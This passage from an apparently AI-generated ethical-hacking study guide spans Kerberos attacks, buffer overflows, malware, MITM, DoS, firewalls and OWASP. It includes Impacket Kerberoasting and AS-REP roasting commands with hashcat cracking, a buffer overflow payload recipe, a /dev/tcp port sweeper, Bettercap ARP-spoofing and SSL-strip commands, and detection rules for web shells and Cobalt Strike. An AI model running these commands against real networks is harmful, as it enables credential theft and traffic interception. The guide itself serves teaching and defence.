|                                 THE 3-PHASE KERBEROS AUTHENTICATION FLOW                           |
+----------------------------------------------------------------------------------------------------+

       CLIENT (User)                     KEY DISTRIBUTION CENTER (KDC / DC)            TARGET SERVICE
             │                                        │                                      │
             │ ─── 1. AS-REQ (Timestamp enc with user hash) ──>                      │
             │ <── 2. AS-REP (TGT enc with KRBTGT key) ────────                      │
             │                                        │                                      │
             │ ─── 3. TGS-REQ (TGT + Requested SPN) ──────────>                      │
             │ <── 4. TGS-REP (Service Ticket enc with svc key)                      │
             │                                        │                                      │
             │ ────────────────────── 5. AP-REQ (Service Ticket + Authenticator) ──> │
             │ <───────────────────── 6. AP-REP (Mutual Authentication Confirmation) │
```

#### Detailed Message Breakdown
1. **AS-REQ (Authentication Service Request):** The client encrypts the current timestamp with their own password hash (known as **Kerberos Pre-Authentication**) and sends it to the KDC to prove identity.
2. **AS-REP (Authentication Service Reply):** The KDC decrypts the timestamp with the user's stored hash. If valid, the KDC generates:
   - A **Ticket Granting Ticket (TGT)**: Encrypted exclusively with the secret key of the domain's **`krbtgt`** account.
   - A **TGS Session Key**: Encrypted with the user's password hash.
3. **TGS-REQ (Ticket Granting Service Request):** When the user wants to access a service (e.g., MSSQL), they send their TGT and the **Service Principal Name (SPN)** to the KDC.
4. **TGS-REP (Ticket Granting Service Reply):** The KDC decrypts the TGT using its `krbtgt` key. If valid, it extracts the user's group memberships and issues a **Service Ticket (ST)** encrypted with the **Target Service Account's password hash**.
5. **AP-REQ (Application Request):** The client presents the Service Ticket directly to the target application server.
6. **AP-REP (Application Reply):** The target server decrypts the Service Ticket using its own password hash and grants access.

---

### AS-REP Roasting vs Kerberoasting Mechanics

| Attack Vector | Prerequisites | Target Object | Vulnerability Root Cause | Hashcat Mode |
| :--- | :--- | :--- | :--- | :---: |
| **AS-REP Roasting** | No domain account required (can be unauthenticated/anonymous). | User accounts with `DONT_REQ_PREAUTH` enabled. | Pre-authentication is disabled; KDC returns AS-REP encrypted with user hash immediately upon request. | `18200` |
| **Kerberoasting** | Valid domain credentials required (any low-privileged user). | Service Accounts associated with an SPN (e.g., `MSSQLSvc`). | KDC encrypts Service Tickets using the service account's password hash; any domain user can request any SPN ticket. | `13100` |

```bash
# AS-REP Roasting with Impacket
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.50

# Kerberoasting with Impacket
impacket-GetUserSPNs corp.local/asmith:Password2026! -dc-ip 10.10.10.50 -request -outputfile kerberoast_hashes.txt

# Crack Kerberoast hashes with Hashcat
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### Golden Ticket vs Silver Ticket Deep Architectural Comparison

```text
+----------------------------------------------------------------------------------------------------+
|                                    GOLDEN TICKET vs SILVER TICKET                                  |
+----------------------------------------------------------------------------------------------------+

     GOLDEN TICKET (Domain Compromise)                        SILVER TICKET (Service Compromise)
  Forged Ticket Granting Ticket (TGT)                      Forged Service Ticket (TGS)
                │                                                        │
                ▼                                                        ▼
  Encrypted with: KRBTGT Account Hash                      Encrypted with: Service Account Hash
  Scope: Entire Active Directory Domain/Forest             Scope: Single Service (e.g., CIFS, MSSQL)
  Interacts with DC: YES (Presents forged TGT)             Interacts with DC: NO (Direct to server)
  Detection: Event ID 4624 / 4672 on DC                    Detection: Very difficult; DC never sees it!
```

| Technical Characteristic | Golden Ticket (Forged TGT) | Silver Ticket (Forged TGS) |
| :--- | :--- | :--- |
| **Compromised Secret Required** | The NTLM hash or AES-256 key of the domain's **`krbtgt`** account. | The NTLM hash or AES key of a **specific service account**. |
| **Ticket Type Forged** | **TGT (Ticket Granting Ticket)** | **TGS / ST (Service Ticket)** |
| **Domain Scope** | **Universal / Forest-Wide:** Complete control of all domain assets. | **Service-Specific:** Access restricted ONLY to that target service. |
| **Communication with DC** | Attacker contacts KDC presenting forged TGT to request service tickets. | **Zero DC Communication:** Ticket is presented directly to target server. |
| **Default Lifetime** | Arbitrary (typically forged for **10 years**). | Arbitrary (typically forged for **10 years**). |
| **SOC Event ID Detection** | **Event ID 4768 / 4769** on DC with anomalous lifetimes or ciphers. | **Event ID 4624** on target server ONLY; no logs generated on DC! |

---

### Keyloggers & Spyware Mechanisms
**Keyloggers** capture keystrokes, clipboard entries, and credentials:
- **Hardware Keyloggers:** Inline USB/PS2 connectors capturing electrical pin transitions; transparent to endpoint detection software.
- **Software API Hooking Keyloggers:** Use the Windows User32 API `SetWindowsHookEx(WH_KEYBOARD_LL, ...)` to intercept keystroke messages (`WM_KEYDOWN`, `WM_KEYUP`) before delivery to target applications.
- **Kernel-Mode Keyloggers:** Rootkit drivers registered in the `kbdclass` device stack to intercept raw keyboard scan codes.
- **Defensive Countermeasures:** Multi-Factor Authentication (FIDO2/WebAuthn), Endpoint Detection & Response (EDR) hooking alerts, keystroke encryption drivers.

---

### Buffer Overflow Mechanics: Stack Layout, Registers & EIP Overwrite
A **Stack-Based Buffer Overflow** occurs when a program writes more data to a buffer allocated on the call stack than the buffer was designed to hold, overwriting adjacent memory control structures.

```text
+----------------------------------------------------------------------------------------------------+
|                                    STACK MEMORY LAYOUT (GROWING DOWNWARDS)                         |
+----------------------------------------------------------------------------------------------------+

 Lower Memory Addresses (0x00000000)
    │
    ▼   [Local Variable Buffer]       char buffer[64]  <-- Input fills here
        ──────────────────────────
        [Saved Frame Pointer (EBP)]   4 bytes (x86) or 8 bytes (x64)
        ──────────────────────────
        [Return Address (EIP/RIP)]    Target of Hijack! Overwritten with address of shellcode
        ──────────────────────────
        [Function Parameters]         Arguments passed to calling function
    ▲
    │
 Higher Memory Addresses (0xFFFFFFFF)
```

#### The 5-Phase Exploitation Sequence
1. **Crash & Spiking:** Identify the input size that crashes the process using a Python fuzzer.
2. **Finding the Offset:** Generate a cyclic non-repeating pattern (`msf-pattern_create -l 2000`), inject it, observe the exact four bytes written to `EIP` in a debugger (e.g., `0x39694438`), and calculate the offset (`msf-pattern_offset -q 39694438`).
3. **Identifying Bad Characters:** Send all bytes from `\x01` to `\xff` (excluding `\x00` null byte) to identify characters truncated or transformed by the application string parser.
4. **Locating a Trampoline (`JMP ESP`):** Search the binary's loaded DLLs for a static instruction `JMP ESP` (`\xff\xe4`) located in a memory module without memory protections (**SafeSEH, ASLR, DEP disabled**).
5. **Crafting Final Payload:**
   ```text
   [ PAYLOAD = "A" * Offset ] + [ Address of JMP ESP ] + [ NOP Sled (\x90 * 32) ] + [ Shellcode ]
   ```

#### Memory Defenses Matrix
- **ASLR (Address Space Layout Randomization):** Randomizes memory base offsets on reboot.
- **DEP / NX (Data Execution Prevention / No-Execute):** Marks stack pages non-executable, preventing direct shellcode execution.
- **Stack Canaries (`/GS`):** Places a random secret integer before `EBP`; the function validates this integer before returning. If modified, the program terminates immediately.

---

### Privilege Escalation vs Session Hijacking Distinction

```text
+-----------------------------------------------------------------------------------+
|                        PRIVILEGE ESCALATION vs SESSION HIJACKING                  |
+-----------------------------------------------------------------------------------+
| PRIVILEGE ESCALATION (Local Host Boundary)                                        |
| • Target: Local OS permissions (Kernel, System Services, Filesystem)              |
| • Vertical: Low-priv user (UID 1001) ──[Kernel Exploit/SUID]──> Root (UID 0)      |
| • Horizontal: User Alice (UID 1001) ──[Misconfig/Sudo]───────> User Bob (UID 1002)|
|                                                                                   |
| SESSION HIJACKING (Network / Application Boundary)                                |
| • Target: Active communication channel between a legitimate client and server     |
| • Layer 4: TCP Sequence Number prediction to inject commands into active stream   |
| • Layer 7: Stealing HTTP Session Cookies via XSS / MITM to impersonate logged-in  |
+-----------------------------------------------------------------------------------+
```

---

### CI/CD Pipeline Security & Poisoned Pipeline Execution (PPE)
Continuous Integration / Continuous Deployment (CI/CD) pipelines automate software compilation and release. Attackers target CI/CD systems to compromise production environments via the supply chain:
- **Poisoned Pipeline Execution (PPE):** An attacker submits a Pull Request containing a malicious modification to the pipeline definition file (e.g., `.github/workflows/build.yml`), forcing the CI runner to execute arbitrary code with access to environment secrets (`AWS_SECRET_ACCESS_KEY`, `DOCKER_PASSWORD`).
- **Unpinned Actions:** Referencing third-party actions by branch name (`uses: actions/checkout@main`) rather than an immutable commit SHA (`uses: actions/checkout@b4ffde...`), exposing builds to supply chain tampering if the upstream repository is compromised.

---

### Offensive & Defensive Bash Scripting Engineering
Bash scripting enables rapid automation of repetitive scanning, parsing, and monitoring operations.

#### Offensive Script: Multi-Threaded TCP Port Sweeper (`sweep.sh`)
```bash
#!/bin/bash
# Multi-threaded TCP Port Sweeper
TARGET_SUBNET="10.10.10"
PORT=445

echo "[*] Scanning $TARGET_SUBNET.0/24 for active port $PORT..."
for host in $(seq 1 254); do
    (
        timeout 1 bash -c "echo > /dev/tcp/$TARGET_SUBNET.$host/$PORT" 2>/dev/null && \
        echo "[+] Port $PORT OPEN on: $TARGET_SUBNET.$host"
    ) &
done
wait
echo "[*] Sweep complete."
```

#### Defensive Script: Failed SSH Login Monitor & Auto-Blocker (`ban_brute.sh`)
```bash
#!/bin/bash
# Automated Log Anomaly Parser & IPTables Enforcer
LOG_FILE="/var/log/auth.log"
THRESHOLD=5

grep "Failed password" "$LOG_FILE" | awk '{print $(NF-3)}' | sort | uniq -c | while read count ip; do
    if [ "$count" -ge "$THRESHOLD" ]; then
        if ! iptables -C INPUT -s "$ip" -j DROP 2>/dev/null; then
            echo "[!] Brute-force detected: $ip ($count attempts). Applying IPTables DROP rule."
            iptables -A INPUT -s "$ip" -j DROP
        fi
    fi
done
```

---

## 5. Module 07: Malware Threats, APT Lifecycle & SOC YARA Engineering

### Malware Taxonomy & Advanced Persistent Threat (APT) Tradecraft
- **Trojans:** Malicious software masquerading as benign utilities (RATs like AsyncRAT, QuasarRAT).
- **Ransomware:** Symmetric/Asymmetric encryption of data assets with triple extortion (Data encryption, Data leak threats, DDoS harassment).
- **Rootkits:** Kernel-level modules that hook OS system calls to conceal running processes, network sockets, and files.
- **APT (Advanced Persistent Threat):** Nation-state or well-funded syndicates employing custom zero-days, extensive reconnaissance, and **Living-off-the-Land Binaries (LOLBins)** such as `certutil.exe`, `wmic.exe`, and `powershell.exe` to evade signature-based antivirus solutions.

---

### SOC Engineering with YARA: Structure, Byte Patterns & Production Rules
**YARA** is the de facto standard pattern-matching engine used by SOC analysts, malware reverse engineers, and incident responders to classify files, memory dumps, and processes based on binary or textual signatures.

```text
+-----------------------------------------------------------------------------------+
|                             ANATOMY OF A YARA RULE                                |
+-----------------------------------------------------------------------------------+
|  rule Rule_Name {                                                                 |
|      meta:         // Informational metadata (Author, Date, Reference, Severity)  |
|      strings:      // Text strings, Hex byte patterns, Regular expressions        |
|      condition:    // Boolean logic determining if the rule matches               |
|  }                                                                                |
+-----------------------------------------------------------------------------------+
```

#### Production YARA Rule 1: Malicious PHP Web Shell Detection
```yara
rule WebShell_PHP_Obfuscated_Execution {
    meta:
        description = "Detects obfuscated PHP webshells employing base64 decode and command execution"
        author = "SOC Engineering Team"
        date = "2026-10-27"
        severity = "High"
    strings:
        $php_tag = "<?php" nocase
        $eval = "eval(" nocase
        $base64 = "base64_decode(" nocase
        $system = "system(" nocase
        $passthru = "passthru(" nocase
        $shell_exec = "shell_exec(" nocase
        $hex_pattern = { 65 76 61 6c 28 62 61 73 65 36 34 } // "eval(base64" in hex
    condition:
        $php_tag at 0 and 
        ($hex_pattern or ($eval and $base64 and ($system or $passthru or $shell_exec))) and
        filesize < 500KB
}
```

#### Production YARA Rule 2: Cobalt Strike Beacon Memory Pattern
```yara
import "pe"

rule CobaltStrike_Beacon_Loader {
    meta:
        description = "Identifies Cobalt Strike reflective DLL loaders based on PE headers and shellcode stubs"
        author = "Threat Hunting Mentor"
        severity = "Critical"
    strings:
        // x86 / x64 API hashing pattern used by Metasploit and Cobalt Strike
        $beacon_stub = { FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 }
        $cs_pipe = "\\\\.\\pipe\\MSSE-" ascii wide
    condition:
        uint16(0) == 0x5A4D and // MZ Header
        ($beacon_stub or $cs_pipe) and
        pe.number_of_sections > 2
}
```

---

## 6. Module 08: Sniffing, Snooping, Spoofing & Network Attacks

### Snooping vs Sniffing vs Spoofing vs Poisoning
Clear semantic and technical boundaries are essential for both offensive methodology and SOC incident triage:

```text
+----------------------------------------------------------------------------------------------------+
|                                    NETWORK ATTACK TAXONOMY MATRIX                                  |
+----------------------------------------------------------------------------------------------------+

  [SNOOPING]                          [SNIFFING]
  Passive observation. Eavesdropping   Capturing raw data frames on wire   
  on unencrypted cleartext data        via promiscuous network interface   
  (e.g., viewing shoulder traffic).    (e.g., Wireshark, Tshark).          
              │                                    │
              ▼                                    ▼
  [SPOOFING]                          [POISONING]
  Falsifying identity fields within    Actively corrupting state caches    
  headers (e.g., forging IP source,    and tables (e.g., ARP tables,       
  MAC source, or DNS transaction ID).  DNS cache, DHCP lease databases).   
```

---

### Traffic Analysis: Wireshark & Headless Tshark Workflows
Network protocol analyzers capture frames directly from the Network Interface Card (NIC) running in **promiscuous mode**.

#### Wireshark Display Filters for Threat Hunting
- `tcp.flags.syn == 1 && tcp.flags.ack == 0`: Identifies SYN scan sweeps and DoS floods.
- `http.request.method == "POST"`: Targets credential submissions and file upload activity.
- `kerberos.CNameString contains "admin"`: Isolates administrative Kerberos ticket requests.
- `dns.flags.response == 1 && dns.count.answers == 0`: Flags NXDOMAIN spikes typical of DGA malware.

#### Headless SOC Packet Analysis with `tshark`
```bash
# Capture live traffic and extract HTTP POST payloads in real time
tshark -i eth0 -Y "http.request.method == POST" -T fields -e ip.src -e ip.dst -e http.user_agent -e urlencoded-form.key -e urlencoded-form.value

# Isolate DNS queries and extract queried domain names
tshark -r incident.pcap -Y "dns.flags.response == 0" -T fields -e ip.src -e dns.qry.name | sort | uniq -c | sort -nr
```

---

### Bettercap MITM Orchestration
**Bettercap** is a modern, modular Go-based framework for executing Man-in-the-Middle (MITM) operations on local subnets.

```bash
# Launch interactive Bettercap session
bettercap -iface eth0

# Bettercap Interactive Commands:
net.probe on              # Actively discover all live hosts on subnet
net.show                  # Display discovered IP, MAC, and vendor mappings
set arp.spoof.targets 10.10.10.50,10.10.10.1  # Set target victim and gateway
set arp.spoof.fullduplex true                 # Poison both target and gateway
arp.spoof on              # Begin continuous transmission of gratuitous ARP packets
set http.proxy.sslstrip true                  # Strip TLS connections down to HTTP
http.proxy on             # Start intercepting proxy engine
```

---

### ARP Poisoning, MAC Flooding, DHCP Starvation & Layer 2 Defenses

```text
+----------------------------------------------------------------------------------------------------+
|                                    ARP POISONING / SPOOFING FLOW                                   |
+----------------------------------------------------------------------------------------------------+

         [VICTIM WORKSTATION]                    [DEFAULT GATEWAY]
           IP: 10.10.10.50                         IP: 10.10.10.1
         MAC: 00:AA:BB:CC:DD:11                  MAC: 00:AA:BB:CC:DD:99
                   ▲                                       ▲
                   │                                       │
     "10.10.10.1 is at                       "10.10.10.50 is at
     00:AA:BB:CC:DD:EE"                      00:AA:BB:CC:DD:EE"
     (Forged Gratuitous ARP)                 (Forged Gratuitous ARP)
                   │                                       │
                   └───────────────────┬───────────────────┘
                                       │
                            [ATTACKER MACHINE (MITM)]
                                 IP: 10.10.10.75
                             MAC: 00:AA:BB:CC:DD:EE
```

#### Layer 2 Attack Mechanics
1. **ARP Cache Poisoning:** The attacker floods gratuitous ARP replies informing the victim that the router's IP belongs to the attacker's MAC, and informing the router that the victim's IP belongs to the attacker's MAC. Traffic flows through the attacker's machine.
2. **MAC Flooding:** The attacker sends thousands of random source MAC addresses per second (`macof`), filling the switch's Content Addressable Memory (**CAM table**). When the CAM table exhausts its memory, the switch **fails open**, broadcasting all incoming packets to every port like a hub.
3. **DHCP Starvation:** The attacker broadcasts thousands of DHCP discover packets with spoofed MAC addresses using tools like `yersinia` or `dhcpstarv`, exhausting the DHCP address pool so legitimate clients cannot obtain leases. The attacker can then deploy a **Rogue DHCP Server** providing malicious DNS resolvers.

#### Enterprise Layer 2 Defensive Countermeasures
- **Dynamic ARP Inspection (DAI):** The switch validates ARP packets against a trusted database (**DHCP Snooping binding database**). Discards ARP replies with invalid IP-to-MAC bindings.
- **DHCP Snooping:** Configures switch ports as **Trusted** (uplinks to legitimate DHCP servers) or **Untrusted** (access ports where clients connect). Drops unauthorized DHCP server replies on untrusted ports.
- **Port Security:** Restricts the number of MAC addresses learned on an interface; automatically disables (`err-disable`) the port if unauthorized MAC addresses appear.

---

## 7. Module 09: Social Engineering, Identity Theft & Psychological Manipulation

### Human Exploitation Vectors & Cialdini's Psychological Triggers
Social engineering targets human psychology rather than software vulnerabilities. Dr. Robert Cialdini's principles explain why these attacks succeed:

```text
+-----------------------------------------------------------------------------------+
|                         CIALDINI'S PRINCIPLES OF MANIPULATION                     |
+-----------------------------------------------------------------------------------+
| 1. Authority:   Pretending to be IT directors, law enforcement, or executive VPs. |
| 2. Urgency:     "Account suspended in 15 minutes unless verified immediately."    |
| 3. Scarcity:    "Only 2 bonus gift cards remaining for respondents."               |
| 4. Social Proof:"All engineering leads have already updated their security token."|
| 5. Likability:  Building rapport through flattery and simulated common interests. |
| 6. Reciprocity: Offering minor tech support or favors before asking for access.   |
+-----------------------------------------------------------------------------------+
```

---

### Identity Theft, Manipulation & Synthetic Identities
- **Credential Harvesting Reverse Proxies:** Modern phishing platforms like **Evilginx2** operate as reverse proxies sitting between the victim and legitimate authentication providers (Microsoft 365, Google). The victim authenticates through the proxy, which captures the authentication session cookies in real time, **bypassing Multi-Factor Authentication (MFA)**.
- **Synthetic Identity Theft:** Fabricating a completely new identity by combining real compromised Personally Identifiable Information (e.g., a real SSN) with fake demographic data (fictitious name and address), creating fraudulent credit profiles that escape traditional fraud filters.

---

## 8. Module 10: Denial-of-Service (DoS), DDoS & Botnets

### DoS vs DDoS Mechanics & Botnet C2 Topologies
- **Denial-of-Service (DoS):** A single attack system exhausting the processing capacity or network bandwidth of a target.
- **Distributed Denial-of-Service (DDoS):** Thousands of compromised systems (**Zombies/Bots**) orchestrated simultaneously against a victim.

```text
+----------------------------------------------------------------------------------------------------+
|                                    BOTNET COMMAND & CONTROL ARCHITECTURES                          |
+----------------------------------------------------------------------------------------------------+

     CENTRALIZED C2 (IRC / HTTP / HTTPS)                   PEER-TO-PEER (P2P) BOTNET
               [Botmaster]                                        [Botmaster]
                    │                                                  │
                    ▼                                                  ▼
          [Central C2 Server]                                     [Peer Node 1]
           (Single Point of                                       ▲           ▲
              Failure!)                                          │             │
        ┌───────────┼───────────┐                         [Peer Node 2] <───> [Peer Node 3]
        ▼           ▼           ▼                                 ▲                 ▲
     [Bot 1]     [Bot 2]     [Bot 3]                              │                 │
                                                              [Peer Node 4] <───> [Peer Node 5]
```

---

### Volumetric, Protocol/State & Layer 7 Attacks

```text
+-----------------------------------------------------------------------------------+
|                         THE THREE TIERS OF DENIAL-OF-SERVICE                      |
+-----------------------------------------------------------------------------------+
| 1. Volumetric Attacks: Measured in Gbps (Gigabits per second).                    |
|    • UDP Floods, ICMP Floods, DNS/NTP Reflection & Amplification.                 |
|                                                                                   |
| 2. Protocol & State Exhaustion: Measured in Mpps (Million packets per second).    |
|    • TCP SYN Flood, Ping of Death, Smurf ICMP Broadcast.                         |
|                                                                                   |
| 3. Application Layer (Layer 7): Measured in RPS (Requests per second).            |
|    • HTTP GET/POST Floods, Slowloris, RUDY (R-U-Dead-Yet).                        |
+-----------------------------------------------------------------------------------+
```

#### Application Layer: Slowloris Deep Mechanics
**Slowloris** keeps hundreds of HTTP connections open simultaneously on the target web server by sending partial HTTP request headers at regular intervals (every 10–15 seconds) without ever completing the request:
```http
GET / HTTP/1.1\r\n
Host: victim.com\r\n
User-Agent: Mozilla/5.0...\r\n
X-a: 1\r\n
... [Waits 10 seconds] ...
X-b: 2\r\n
```
The web server reserves a dedicated thread/process for each connection, waiting for the final double-newline (`\r\n\r\n`). Within seconds, the server's thread pool reaches its maximum connection limit (`MaxRequestWorkers`), preventing legitimate users from establishing connections while consuming negligible bandwidth from the attacker.

---

## 9. Module 11: Session Hijacking & Web Proxies

### Layer 4 (Transport) vs Layer 7 (Application) Session Hijacking

| Comparison Dimension | Layer 4 (Transport Layer Hijacking) | Layer 7 (Application Layer Hijacking) |
| :--- | :--- | :--- |
| **Target Mechanism** | Active TCP 3-way handshake state & sequence numbers ($SEQ / ACK$). | Application session identifiers (Cookies, JWT tokens, Bearer tokens). |
| **Exploitation Technique**| Blind sequence number guessing, TCP Reset injection, ARP MITM. | Cross-Site Scripting (XSS), cookie snooping, session fixation. |
| **Attacker Requirement**| Direct inline access or local subnet visibility. | Can be executed globally over the Internet via client-side scripts. |
| **Primary Mitigation** | IPsec, TLS encryption across transport stream, randomized ISN. | `HttpOnly`, `Secure`, `SameSite=Strict` cookie flags, short lifetimes. |

---

### Proxy Tooling: Caido vs Burp Suite Comparative Breakdown
Intercepting web proxies allow security practitioners to capture, inspect, and modify HTTP/HTTPS traffic in real time.

```text
+----------------------------------------------------------------------------------------------------+
|                                    CAIDO vs BURP SUITE ARCHITECTURE                                |
+----------------------------------------------------------------------------------------------------+

       CAIDO (Rust Core Engine)                              BURP SUITE (Java JVM Engine)
  • Single native compiled binary                       • Heavy Java Virtual Machine process
  • Client/Server daemon model                          • Monolithic desktop application
  • Exceptional memory efficiency (~30MB RAM)           • Substantial memory footprint (1GB–4GB RAM)
  • Modern web-based interface (accessible via VPS)     • Swing-based GUI with extensive enterprise tooling
  • Fast text search & filter execution                 • Expansive extension ecosystem (BApp Store)
```

| Evaluation Vector | Caido | PortSwigger Burp Suite Professional |
| :--- | :--- | :--- |
| **Core Architecture** | Compiled **Rust** backend with lightweight web frontend. | **Java (JVM)** desktop application. |
| **Resource Consumption** | Minimal (under 50 MB RAM baseline); ultra-fast boot. | Substantial (frequently consumes 1.5 GB to 4 GB RAM). |
| **Headless / Remote Use**| **Native:** Run daemon on remote VPS; access UI in local browser. | Supported primarily via Burp Enterprise API or X11 forwarding. |
| **Tooling & Ecosystem** | Focused core: Intercept, HTTP History, Replay, Automate. | Expansive: Scanner, Intruder, Collaborator, BApp Store extensions. |
| **Best Used For** | Cloud VPS recon, lightweight laptops, fast scriptable triage. | Deep manual web application penetration testing and corporate audits. |

---

## 10. Module 12: Evading IDS, Firewalls & Honeypots

### Network Segmentation, Security Zones & DMZ Architecture
Enterprise architectures partition networks into zones separated by stateful inspection devices:

```text
+----------------------------------------------------------------------------------------------------+
|                                  ENTERPRISE SECURITY ZONE ARCHITECTURE                             |
+----------------------------------------------------------------------------------------------------+

 [UNTRUSTED: Internet]
          │
          ▼
   [EXTERNAL FIREWALL]
          │
          ├─────────────────────────────────────────┐
          │                                         │
          ▼                                         ▼
   [DMZ ZONE]                                [INTERNAL CORPORATE FIREWALL]
   • Public Web Server (TCP 80/443)                 │
   • External Mail Relay (TCP 25)                   ├────────────────────────┬───────────────────────┐
   • Reverse Proxy                                  │                        │                       │
                                                    ▼                        ▼                       ▼
                                             [INTERNAL LAN]           [DATABASE ZONE]         [MANAGEMENT]
                                             • Employee PCs           • Active Directory DC   • SIEM Platform
                                             • Workstations           • Core Database cluster • Admin Consoles
```

---

### Snort IDS/IPS Architecture & Detection Engineering
*(Clarification: Correcting the user prompt's "snot" typo to the industry-standard IDS/IPS **Snort**).*

**Snort** operates across four functional components:
1. **Packet Decoder:** Intercepts raw network frames across protocols.
2. **Preprocessors:** Reassembles fragmented packets, normalizes HTTP URIs, and detects port scans.
3. **Detection Engine:** Evaluates reassembled packets against signature rules.
4. **Output Plugins:** Writes alerts to syslog, SIEM connectors, or packet capture files.

```text
Snort Rule Structure:
[Action] [Proto] [Src_IP] [Src_Port] -> [Dst_IP] [Dst_Port] ([Rule Options: msg, content, sid, rev])
```

#### Production Snort Rule: Detecting Directory Traversal Attacks
```snort
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"ATTACK-RESPONSES Directory Traversal /etc/passwd Attempt";
    flow:to_server,established;
    content:"/etc/passwd"; http_uri;
    content:".."; http_uri;
    metadata:service http;
    classtype:web-application-attack;
    sid:1000042;
    rev:1;
)
```

---

### Firewall Taxonomy & Gateway Attack Techniques
1. **Stateless Packet Filters:** Inspect Layer 3 and Layer 4 headers (IP, Port) in isolation without tracking session states.
2. **Stateful Inspection Firewalls:** Maintain a **State Table** tracking connection handshakes ($SYN \rightarrow SYN/ACK \rightarrow ACK$).
3. **Application Layer Gateways (Proxy Firewalls):** Re-terminate client connections and establish separate outbound sessions, inspecting Layer 7 payloads.
4. **Next-Generation Firewalls (NGFW):** Combine stateful filtering with real-time deep packet inspection, application signature matching, TLS decryption, and identity mapping.

---

### Palo Alto Next-Gen Firewall (NGFW): App-ID, User-ID, Content-ID & Evasion
Palo Alto Networks NGFWs process traffic through their **Single-Pass Parallel Processing (SP3)** architecture, organizing detection across three pillars:

```text
+----------------------------------------------------------------------------------------------------+
|                               PALO ALTO NGFW THREE CORE PILLARS (SP3)                              |
+----------------------------------------------------------------------------------------------------+

  1. App-ID (Application Identification):
     • Identifies applications regardless of port, protocol, or SSL encryption.
     • Defeats evasion: Even if SSH runs on Port 80, App-ID classifies it as 'ssh', not 'web-browsing'.
  
  2. User-ID (User Identification):
     • Maps IP addresses directly to Active Directory user accounts, groups, and security roles.
     • Policy example: "Allow 'Finance-Group' access to SAP-Cloud; deny all others."
  
  3. Content-ID (Threat & Data Protection):
     • Deep Packet Inspection (DPI) scanning for malware, exploits, and credit card / PII data leaks.
     • WildFire integration: Sandboxes unknown zero-day files in the cloud within minutes.
```

#### Palo Alto Limitations & Evasion Vectors
- **SSL Decryption Overhead:** Deep packet inspection requires SSL Forward Proxy decryption. If high-throughput links disable TLS decryption to conserve CPU, malicious payloads pass uninspected inside encrypted HTTPS streams.
- **Protocol Anomaly Evasion:** HTTP chunked transfer encoding, base64 obfuscation within WebSockets, and slow fragmented requests can occasionally cause content inspection buffers to time out.

---

### Anonymous Proxies & Onion Routing
- **SOCKS4 vs SOCKS5:** SOCKS4 supports only TCP without authentication; SOCKS5 adds UDP proxying, authentication methods, and **remote DNS resolution** (preventing DNS leakage via `proxychains-ng`).
- **Tor (The Onion Router):** Routes traffic through a volunteer network of three encrypted nodes: **Guard Node**, **Middle Relay**, and **Exit Node**. Each relay decrypts only its layer of symmetric encryption, ensuring no single entity knows both the source IP and destination IP.

---

## 11. Modules 13 & 14: Web Servers, Applications & OWASP Top 10

### Web Server Architectures & Flaws
Web servers serve application content using architectures like **Apache HTTP Server** (process/thread-per-connection via MPM modules), **Nginx** (asynchronous, event-driven engine), and **Microsoft IIS** (worker process pooling with `w3wp.exe`). Common administrative weaknesses include:
- Unrestricted HTTP methods (`PUT`, `DELETE`, `TRACE`).
- Directory indexing enabled on web roots.
- Default administrative consoles exposed (`/manager/html` on Apache Tomcat, `/phpmyadmin`).

---

### AI Prompting for Penetration Testing
Security analysts leverage Large Language Models (LLMs) to accelerate security workflows. Structured prompt engineering produces reliable technical output:

```text
+-----------------------------------------------------------------------------------+
|                        STRUCTURED SECURITY PROMPT ENGINEERING                     |
+-----------------------------------------------------------------------------------+
| 1. System Role:     "You are a Senior Web Application Penetration Tester."        |
| 2. Input Context:   "Here is an intercepted HTTP POST request: [Raw Request]"     |
| 3. Clear Task:      "Analyze potential parameter injection vectors."              |
| 4. Technical Bounds:"Identify SQLi, SSRF, and Command Injection surfaces.         |
|                      Provide curl reproduction commands for authorized lab trial."|
+-----------------------------------------------------------------------------------+
```

---

### OWASP Top 10: 2017 vs 2021 Structural Evolution
The Open Web Application Security Project (OWASP) Top 10 documents the most critical web application security risks:

```text
+----------------------------------------------------------------------------------------------------+
|                               OWASP TOP 10 EVOLUTION (2017 vs 2021)                                |
+----------------------------------------------------------------------------------------------------+

     OWASP Top 10: 2017                                          OWASP Top 10: 2021
  A01: Injection ──────────────────────────────────────────────> A03: Injection
  A02: Broken Authentication ──────────────────────────────────> A07: Identification & Auth Failures
  A03: Sensitive Data Exposure ────────────────────────────────> A02: Cryptographic Failures
  A04: XML External Entities (XXE) ────────────────────────────> Merged into A05: Security Misconfig
  A05: Broken Access Control ──────────────────────────────────> A01: Broken Access Control (Rank #1!)
  A06: Security Misconfiguration ──────────────────────────────> A05: Security Misconfiguration
  A07: Cross-Site Scripting (XSS) ─────────────────────────────> Merged into A03: Injection
  A08: Insecure Deserialization ───────────────────────────────> Merged into A08: Software/Data Integrity
  A09: Using Components with Known Vulnerabilities ────────────> A06: Vulnerable & Outdated Components
  A10: Insufficient Logging & Monitoring ──────────────────────> A09: Security Logging & Monitoring
       [NEW CATEGORY ADDED] ───────────────────────────────────> A04: Insecure Design
       [NEW CATEGORY ADDED] ───────────────────────────────────> A08: Software & Data Integrity Failures
       [NEW CATEGORY ADDED] ───────────────────────────────────> A10: Server-Side Request Forgery (SSRF)
```

| 2021 Category | Shift from 2017 | Core Mechanical Concern |
| :--- | :---: | :--- |
| **A01: Broken Access Control** | **Rose from #5 to #1** | 94% of tested applications had access control flaws (IDOR, horizontal/vertical escalation). |
| **A02: Cryptographic Failures** | Moved up from #3 | Insecure ciphers, cleartext transmission of sensitive data, weak key generation. |
| **A03: Injection** | Dropped from #1 to #3 | Includes SQLi, XSS, Command Injection, LDAP injection. |
| **A04: Insecure Design** | **Brand New Category** | Flaws inherent to architecture before code is written; missing threat modeling. |
| **A05: Security Misconfiguration** | Rose from #6 | Unpatched defaults, misconfigured HTTP headers, exposed cloud storage. |
| **A06: Vulnerable & Outdated Components**| Rose from #9 | Dependencies, open-source libraries with unpatched CVEs. |
| **A07: Identification & Authentication** | Dropped from #2 | Credential stuffing, brute-force vulnerability, missing MFA. |
